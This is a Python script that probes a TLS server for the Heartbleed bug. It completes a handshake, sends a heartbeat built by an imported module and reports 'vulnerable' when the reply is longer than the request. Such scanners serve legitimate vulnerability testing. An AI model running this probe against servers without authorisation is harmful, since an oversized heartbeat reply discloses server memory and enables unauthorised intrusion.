__author__ = 'Qubo'

import socket
import struct
import handshake

address = '127.0.0.1'  # Hostname/IP address of the target server
port = 443 # Port of the target server


def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))

    print ('===================== CONNECT ======================')
    print (address + ':' + str(port) + ' connected...\n')

    print ('===================== HANDSHAKE ========================')

    hello = handshake.clientHello()
    s.send(hello)
    print ('TLS Client Hello sent, waiting for Server Hello Done...')

    # Retrieving Server Hello reply.
    # Server Hello reply may contain multiple Record Layer diagrams...
    # We need to retrieve them 1 by 1.

    header_length = 5  # initial (Record Layer) header length = sizeof(content_type) + sizeof(content_version) + sizeof(content_length) = 1 + 2 + 2

    while 1:
        data = s.recv(header_length)

        if '' == data:
            print('Server Hello Done not received, probably need to ajdust Client Hello properties in handshake.py...')
            s.close()
            return False

        content_length = struct.unpack('>3sH', data)[1]
        data = s.recv(content_length)

        handshake_type, data = struct.unpack('s' + str(len(data) - 1) + 's', data) # Get Handshake Type
        if '0e' == handshake_type.encode('hex'):
            print('TLS Server Hello Done...\n')
            break

    print ('===================== HEARTBEAT ========================')

    #print heartbeat

    heartbeat = handshake.heartbeat()
    heartbeat_length = len(heartbeat)
    s.send(heartbeat)
    print ('TLS client Heartbeat sent...')

    print('Waiting for TLS Server Heartbeat Reply...')
    server_heartbeat_reply = ''
    while 1:
        data = s.recv(1024)
        if '' != data:
            server_heartbeat_reply += data
        else:
            break

    if '' == server_heartbeat_reply:
        print('Server replied nothing: likely not vulnerable...')
    # elif (should consider the case server replies Alert protocol, not implemented here):
    elif len(server_heartbeat_reply) <= heartbeat_length:
        print('Server reply received: likely not vulnerable...')
    else:
        print('Server reply received: vulnerable!!!')

    s.close()

if __name__ == '__main__':
    main()